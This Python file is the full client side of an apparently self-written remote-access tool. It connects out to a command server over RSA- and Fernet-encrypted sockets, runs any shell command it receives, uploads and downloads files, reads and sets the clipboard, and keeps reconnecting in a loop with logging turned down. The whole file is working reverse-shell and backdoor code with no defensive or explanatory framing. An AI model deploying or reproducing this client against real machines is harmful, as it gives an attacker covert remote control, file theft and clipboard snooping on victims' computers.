import logging
import os
import pickle
import signal
import socket
import subprocess
import time
from multiprocessing import Process, Queue

import pyperclip
from cryptography.fernet import Fernet
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding, rsa

logging.basicConfig(level=logging.CRITICAL)

def Hasher(MESSAGE : bytes):

    digest = hashes.Hash(hashes.SHA256(), backend=default_backend())
    digest.update(MESSAGE)
    return digest.finalize()

def verifySignature(publicKey, signature, message):
    try:
        publicKey.verify(
            signature,
            message,
            padding.PSS(
                mgf=padding.MGF1(hashes.SHA256()),
                salt_length=padding.PSS.MAX_LENGTH
            ),
            hashes.SHA256()
        )
        return True
    except:
        return False

def sign(privateKey, data):
    signature = privateKey.sign(
        data,
        padding.PSS(
            mgf=padding.MGF1(hashes.SHA256()),
            salt_length=padding.PSS.MAX_LENGTH
        ),
        hashes.SHA256()
    )
    return signature

def encrypt(publicKey, plaintext):
    ciphertext = publicKey.encrypt(
        plaintext,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None)
    )
    return ciphertext

def decrypt(privateKey, ciphertext):
    plaintext = privateKey.decrypt(
        ciphertext,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return plaintext


def public_bytes(publicKey):
    serializedPublic = publicKey.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )
    return serializedPublic


def shell(q, data):
    try:
        cmd = subprocess.Popen(data[:].decode(), shell=True, stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        q.put(output_bytes.decode(errors="replace"))
    except Exception as e:
        # TODO: Error description is lost
        q.put("Command execution unsuccessful: %s" %str(e))
    return


class Client(object):

    def __init__(self):
        self.serverHost = '127.0.0.1'
        self.serverPort = 9999
        self.socket = None

        self.Fer_key = Fernet.generate_key()
        logging.debug(self.Fer_key)
        self.Fer = Fernet(self.Fer_key)

        self.privateKey = rsa.generate_private_key(public_exponent=65537, key_size=4096, backend=default_backend())
        self.publicKey = self.privateKey.public_key()

        self.Threads = []
        self.q = Queue()
        self.WAIT_TIME = 10

    def socket_create(self):
        """ Create a socket """
        try:
            self.socket = socket.socket()
        except socket.error as e:
            logging.error("Socket creation error" + str(e))
            return
        return

    def socket_connect(self):
        """ Connect to a remote socket """
        try:
            self.socket.connect((self.serverHost, self.serverPort))
        except socket.error as e:
            logging.error("Socket connection error: " + str(e))
            time.sleep(5)
            raise
        try:
            self.socket.send(public_bytes(self.publicKey))
            serverPublic = serialization.load_pem_public_key(self.socket.recv(20480), backend=default_backend())

            Hashed_Key = Hasher(self.Fer_key)
            self.socket.send(Hashed_Key)
            if not self.socket.recv(1024) == b'<RECEIVED>':
                raise Exception

            Encrypted = encrypt(serverPublic, self.Fer_key)
            self.socket.send(Encrypted)
            if not self.socket.recv(1024) == b'<RECEIVED>':
                raise Exception

            Hash_Encrypted = Hasher(Encrypted)
            self.socket.send(Hash_Encrypted)
            if not self.socket.recv(1024) == b'<RECEIVED>':
                raise Exception

            Signature = sign(self.privateKey, Hashed_Key)
            self.socket.send(Signature)
            if not self.socket.recv(1024) == b'<RECEIVED>':
                raise Exception

            Encryped_Signature = sign(self.privateKey, Hash_Encrypted)
            self.socket.send(Encryped_Signature)
            if not self.socket.recv(1024) == b'<RECEIVED>':
                raise Exception
            self.send(socket.gethostname().encode())
        except Exception as e:
            logging.error(e)

    def recvall(self, n):
        """ Helper function to recv n bytes or return None if EOF is hit
        :param n:
        :param conn:
        """
        # TODO: this can be a static method
        data = b''
        while len(data) < n:
            packet = self.socket.recv(n - len(data))
            if not packet:
                return None
            data += packet
        return data

    def receive(self):
        length = int(self.Fer.decrypt(self.socket.recv(2048)).decode())
        self.socket.send(b'<RECEIVED>')
        return self.Fer.decrypt(self.recvall(length))

    def send(self, data):
        encrypted = self.Fer.encrypt(data)
        self.socket.send(self.Fer.encrypt(str(len(encrypted)).encode()))
        self.socket.recv(1024)
        self.socket.send(encrypted)

    def threads(self):
        return_threads = "Threads:\n\n"
        for thr in self.Threads:
            if thr[0].is_alive():
                return_threads += "PID: {} - {}".format(thr[0].pid, thr[1])
            else:
                self.Threads.remove(thr)
        return return_threads

    def kill_thread(self, PID):
        try:
            PID = int(PID)
        except:
            return 'PID has to be a integer'
        for thr in self.Threads:
            if thr[0].is_alive():
                if thr[0].pid == PID:
                    thr[0].terminate()
                    return "Killed PID:{} Successfully".format(str(PID))
            else:
                self.Threads.remove(thr)
        return "PID ({}) already killed".format(str(PID))

    def receive_commands(self):
        while True:
            data = self.receive()
            if data == b'<LIST>':
                self.socket.send(b' ')
                continue
            if data == b'<THREADS>':
                self.send(self.threads().encode())
                continue
            if data == b'<SEND>':
                self.send(b'<READY>')
                packed_data = self.receive()
                filedata = pickle.loads(packed_data)
                filename = filedata['filename']
                content = filedata['data']
                with open(filename, 'wb') as f:
                    f.write(content)
                self.send(b'File Transfer Successful')
                continue


            if data == b'<COPY>':
                self.send(b'<READY>')
                pyperclip.copy(self.receive().decode())
                self.send(b'<READY>')


            if data == b'<PASTE>':
                self.send(pyperclip.paste().encode())
                continue

            if data == b'<RECEIVE>':
                self.send(b'<READY>')
                filename = self.receive()
                if not os.path.exists(filename):
                    self.send(b'<TRANSFERERROR>')
                    continue
                with open(filename, 'rb') as f:
                    self.send(f.read())
                continue

            if b'<KILL>' in data:
                self.send(self.kill_thread(data.decode().split(' ')[-1]).encode())
                continue

            if data.decode()[:2].lower() == 'cd':
                try:
                    directory = data.decode()[3:]
                    os.chdir(directory.strip())
                except Exception as e:
                    logging.debug('Error changing cd: {}'.format(str(e)))
                self.send(os.getcwd().encode())
                continue

            if len(data) > 0:
                self.Threads.append((Process(target=shell, args=(self.q, data)), data))
                self.Threads[-1][0].daemon = True
                self.Threads[-1][0].start()
                self.Threads[-1][0].join(self.WAIT_TIME)
                if self.Threads[-1][0].is_alive():
                    self.send(b"Command took too long... Will keep running in background.")
                else:
                    self.send(self.q.get().encode())
                    self.Threads.pop(-1)
                continue

def main():
    client = Client()
    client.socket_create()
    while True:
        try:
            client.socket_connect()
        except:
            time.sleep(5)
        else:
            break
    try:
        client.receive_commands()
    except Exception as e:
        logging.critical('Error in main: {}'.format(str(e)))
    


if __name__ == '__main__':
    while 1:
        main()
